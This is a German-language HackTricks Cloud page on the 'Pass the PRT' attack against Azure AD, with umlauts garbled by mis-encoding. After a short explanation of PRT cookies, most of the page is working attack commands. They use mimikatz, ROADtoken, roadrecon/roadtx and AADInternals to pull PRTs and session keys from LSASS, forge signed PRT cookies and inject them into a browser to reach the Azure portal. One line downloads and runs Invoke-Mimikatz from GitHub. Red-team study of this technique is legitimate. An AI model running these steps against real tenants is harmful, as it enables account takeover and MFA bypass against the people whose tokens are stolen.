# Az - Pass the PRT

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Was ist ein PRT

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### √úberpr√ºfen, ob du einen PRT hast
```
Dsregcmd.exe /status
```
Im Abschnitt SSO State sollte der **`AzureAdPrt`** auf **YES** gesetzt sein.

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

Im selben Output k√∂nnen Sie auch sehen, ob das **Ger√§t mit Azure verbunden** ist (im Feld `AzureAdJoined`):

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

## PRT Cookie

Das PRT-Cookie wird tats√§chlich **`x-ms-RefreshTokenCredential`** genannt und ist ein JSON Web Token (JWT). Ein JWT enth√§lt **3 Teile**, den **Header**, **Payload** und **Signatur**, getrennt durch einen `.` und alle url-sicher base64-codiert. Ein typisches PRT-Cookie enth√§lt den folgenden Header und Body:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
Der eigentliche **Primary Refresh Token (PRT)** ist im **`refresh_token`** gekapselt, der durch einen Schl√ºssel verschl√ºsselt ist, der unter der Kontrolle von Azure AD steht, wodurch sein Inhalt f√ºr uns undekodierbar und undurchsichtig wird. Das Feld **`is_primary`** kennzeichnet die Kapselung des Primary Refresh Token innerhalb dieses Tokens. Um sicherzustellen, dass das Cookie an die spezifische Anmeldesitzung gebunden bleibt, f√ºr die es vorgesehen war, wird der `request_nonce` von der Seite `logon.microsoftonline.com` √ºbertragen.

### PRT-Cookie-Fluss unter Verwendung von TPM

Der **LSASS**-Prozess sendet den **KDF-Kontext** an das TPM, und das TPM verwendet den **Sitzungsschl√ºssel** (gesammelt, als das Ger√§t in AzureAD registriert wurde und im TPM gespeichert ist) und den vorherigen Kontext, um einen **Schl√ºssel abzuleiten**, und dieser **abgeleitete Schl√ºssel** wird verwendet, um das **PRT-Cookie (JWT) zu signieren**.

Der **KDF-Kontext** ist ein Nonce von AzureAD und der PRT, der ein **JWT** mit einem **Kontext** (zuf√§llige Bytes) mischt.

Daher ist es, selbst wenn der PRT nicht extrahiert werden kann, weil er sich im TPM befindet, m√∂glich, LSASS zu missbrauchen, um **abgeleitete Schl√ºssel aus neuen Kontexten anzufordern und die generierten Schl√ºssel zu verwenden, um Cookies zu signieren**.

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

## PRT-Missbrauchsszenarien

Als **normaler Benutzer** ist es m√∂glich, **PRT-Nutzung anzufordern**, indem man LSASS nach SSO-Daten fragt.\
Dies kann wie **native Apps** erfolgen, die Token vom **Web Account Manager** (Token-Broker) anfordern. WAM leitet die Anfrage an **LSASS** weiter, das Token unter Verwendung einer signierten PRT-Best√§tigung anfordert. Oder es kann mit **browserbasierten (Web-) Flows** erfolgen, bei denen ein **PRT-Cookie** als **Header** verwendet wird, um Anfragen an Azure AS-Anmeldeseiten zu authentifizieren.

Als **SYSTEM** k√∂nnten Sie den **PRT stehlen, wenn er nicht durch TPM gesch√ºtzt ist**, oder **mit PRT-Schl√ºsseln in LSASS** unter Verwendung von Krypto-APIs interagieren.

## Pass-the-PRT-Angriffsszenarien

### Angriff - ROADtoken

F√ºr weitere Informationen zu diesem Weg [**siehe diesen Beitrag**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). ROADtoken wird **`BrowserCore.exe`** aus dem richtigen Verzeichnis ausf√ºhren und verwenden, um ein **PRT-Cookie zu erhalten**. Dieses Cookie kann dann mit ROADtools verwendet werden, um sich zu authentifizieren und **einen persistenten Refresh Token zu erhalten**.

Um ein g√ºltiges PRT-Cookie zu generieren, ben√∂tigen Sie zuerst ein Nonce.\
Dies k√∂nnen Sie mit folgendem Befehl erhalten:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
Oder mit [**roadrecon**](https://github.com/dirkjanm/ROADtools):
```powershell
roadrecon auth prt-init
```
Dann k√∂nnen Sie [**roadtoken**](https://github.com/dirkjanm/ROADtoken) verwenden, um einen neuen PRT zu erhalten (im Tool aus einem Prozess des anzugreifenden Benutzers ausf√ºhren):
```powershell
.\ROADtoken.exe <nonce>
```
Als Einzeiler:

{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

Dann k√∂nnen Sie den **generierten Cookie** verwenden, um **Tokens zu generieren**, um sich mit Azure AD **Graph** oder Microsoft Graph **anzumelden**:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Angriff - Verwendung von roadrecon

### Angriff - Verwendung von AADInternals und einem geleakten PRT

`Get-AADIntUserPRTToken` **holt das PRT-Token des Benutzers** vom Azure AD-verbundenen oder Hybrid-verbundenen Computer. Verwendet `BrowserCore.exe`, um das PRT-Token zu erhalten.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
Oder wenn Sie die Werte von Mimikatz haben, k√∂nnen Sie auch AADInternals verwenden, um ein Token zu generieren:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
Gehe zu [https://login.microsoftonline.com](https://login.microsoftonline.com), l√∂sche alle Cookies f√ºr login.microsoftonline.com und f√ºge ein neues Cookie ein.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
Dann gehe zu [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Der Rest sollte die Standardeinstellungen sein. Stellen Sie sicher, dass Sie die Seite aktualisieren k√∂nnen und das Cookie nicht verschwindet. Wenn es verschwindet, haben Sie m√∂glicherweise einen Fehler gemacht und m√ºssen den Prozess erneut durchlaufen. Wenn nicht, sollten Sie in Ordnung sein.
{% endhint %}

### Angriff - Mimikatz

#### Schritte

1. Der **PRT (Primary Refresh Token) wird aus LSASS** (Local Security Authority Subsystem Service) extrahiert und f√ºr die sp√§tere Verwendung gespeichert.
2. Der **Session Key wird als n√§chstes extrahiert**. Da dieser Schl√ºssel zun√§chst ausgegeben und dann vom lokalen Ger√§t neu verschl√ºsselt wird, erfordert dies eine Entschl√ºsselung mit einem DPAPI-Masterkey. Detaillierte Informationen √ºber DPAPI (Data Protection API) finden Sie in diesen Ressourcen: [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) und f√ºr ein Verst√§ndnis seiner Anwendung, siehe [Pass-the-cookie attack](az-pass-the-cookie.md).
3. Nach der Entschl√ºsselung des Session Key werden der **abgeleitete Schl√ºssel und der Kontext f√ºr den PRT erhalten**. Diese sind entscheidend f√ºr die **Erstellung des PRT-Cookies**. Insbesondere wird der abgeleitete Schl√ºssel zum Signieren des JWT (JSON Web Token) verwendet, das das Cookie bildet. Eine umfassende Erkl√§rung dieses Prozesses wurde von Dirk-jan bereitgestellt, zug√§nglich [hier](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/).

{% hint style="danger" %}
Beachten Sie, dass wenn der PRT im TPM und nicht in `lsass` ist, **mimikatz ihn nicht extrahieren kann**.\
Es wird jedoch m√∂glich sein, **einen Schl√ºssel aus einem abgeleiteten Schl√ºssel aus einem Kontext** vom TPM zu erhalten und ihn zu verwenden, um **ein Cookie zu signieren (siehe Option 3).**
{% endhint %}

Eine **detaillierte Erkl√§rung des durchgef√ºhrten Prozesses** zur Extraktion dieser Details finden Sie hier: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
Dies wird nach den Fixes vom August 2021 nicht genau funktionieren, um PRT-Tokens anderer Benutzer zu erhalten, da nur der Benutzer seinen PRT erhalten kann (ein lokaler Administrator kann nicht auf die PRTs anderer Benutzer zugreifen), aber auf seinen eigenen zugreifen kann.
{% endhint %}

Sie k√∂nnen **mimikatz** verwenden, um den PRT zu extrahieren:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(Bilder von https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

**Kopiere** den Teil, der mit **Prt** gekennzeichnet ist, und speichere ihn.\
Extrahiere auch den Sitzungsschl√ºssel (den **`KeyValue`** des **`ProofOfPossesionKey`** Feldes), den du unten hervorgehoben sehen kannst. Dieser ist verschl√ºsselt und wir m√ºssen unsere DPAPI-Masterkeys verwenden, um ihn zu entschl√ºsseln.

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Wenn du keine PRT-Daten siehst, k√∂nnte es sein, dass du **keine PRTs** hast, weil dein Ger√§t nicht Azure AD-verbunden ist, oder es k√∂nnte sein, dass du eine **alte Version** von Windows 10 verwendest.
{% endhint %}

Um den Sitzungsschl√ºssel zu **entschl√ºsseln**, musst du deine Privilegien auf **SYSTEM** erh√∂hen, um im Computer-Kontext auszuf√ºhren und den **DPAPI-Masterkey zur Entschl√ºsselung** verwenden zu k√∂nnen. Du kannst die folgenden Befehle verwenden, um dies zu tun:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

#### Option 1 - Full Mimikatz

* Jetzt m√∂chten Sie beide Context-Werte kopieren:

<figure><img src="../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

* Und den abgeleiteten Schl√ºsselwert:

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

* Schlie√ülich k√∂nnen Sie all diese Informationen verwenden, um **PRT-Cookies zu generieren**:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

* Gehe zu [https://login.microsoftonline.com](https://login.microsoftonline.com), l√∂sche alle Cookies f√ºr login.microsoftonline.com und f√ºge ein neues Cookie ein.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* Then go to [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Der Rest sollte die Standardeinstellungen sein. Stellen Sie sicher, dass Sie die Seite aktualisieren k√∂nnen und das Cookie nicht verschwindet. Wenn es verschwindet, haben Sie m√∂glicherweise einen Fehler gemacht und m√ºssen den Prozess erneut durchlaufen. Wenn nicht, sollten Sie in Ordnung sein.
{% endhint %}

#### Option 2 - roadrecon using PRT

* Erneuern Sie zuerst den PRT, der in `roadtx.prt` gespeichert wird:

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* Jetzt k√∂nnen wir **Tokens anfordern** mit dem interaktiven Browser mittels `roadtx browserprtauth`. Wenn wir den Befehl `roadtx describe` verwenden, sehen wir, dass das Access Token einen MFA-Anspruch enth√§lt, da das in diesem Fall verwendete PRT ebenfalls einen MFA-Anspruch hatte.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

#### Option 3 - roadrecon mit abgeleiteten Schl√ºsseln

Mit dem Kontext und dem von mimikatz abgeleiteten Schl√ºssel ist es m√∂glich, roadrecon zu verwenden, um ein neues signiertes Cookie zu generieren mit:

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## Referenzen

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
